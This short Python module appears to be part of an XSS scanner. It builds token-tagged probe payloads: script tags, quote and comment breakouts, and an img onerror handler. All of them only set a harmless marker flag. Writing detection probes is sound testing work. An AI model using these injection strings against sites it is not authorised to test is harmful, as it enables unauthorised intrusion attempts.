import uuid

MARKER = "window.__xss_fired=1"

PAYLOAD_TEMPLATES = [
    f"<script>{MARKER};/*XSS{{token}}*/</script>",
    f"\"><script>{MARKER};/*XSS{{token}}*/</script>",
    f"'><script>{MARKER};/*XSS{{token}}*/</script>",
    f"<img src=x onerror=\"{MARKER}\" alt=\"XSS{{token}}\">",
    f"\";{MARKER};//XSS{{token}}",
    f"--><script>{MARKER};/*XSS{{token}}*/</script>",
]

def make_probes():
    token = uuid.uuid4().hex[:8]
    payloads = [p.format(token=token) for p in PAYLOAD_TEMPLATES]
    return token, payloads